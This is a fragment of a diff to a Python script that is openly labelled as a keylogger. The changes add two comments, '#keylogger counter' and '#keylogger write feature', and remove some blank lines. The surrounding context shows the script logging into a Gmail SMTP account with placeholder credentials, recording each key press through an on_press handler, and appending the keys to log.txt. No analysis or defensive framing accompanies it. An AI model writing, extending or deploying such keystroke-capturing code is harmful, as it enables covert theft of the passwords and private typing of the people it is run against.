@@ -18,6 +18,7 @@ s.starttls()
 #email login
 s.login('abcdefg@gmail.com','password')
 
+#keylogger counter
 def on_press(key):
     global keys, count
 
@@ -29,6 +30,7 @@ def on_press(key):
         write_file(keys)
         keys = []
 
+#keylogger write feature
 def write_file(keys):
     with open ("log.txt", "a") as f:
         for key in keys:
@@ -37,8 +39,6 @@ def write_file(keys):
                 f.write ('\n')
             elif k.find("Key") == -1:
                 f.write(k)
-
-
 
 def on_release(key):
     if key == Key.esc:
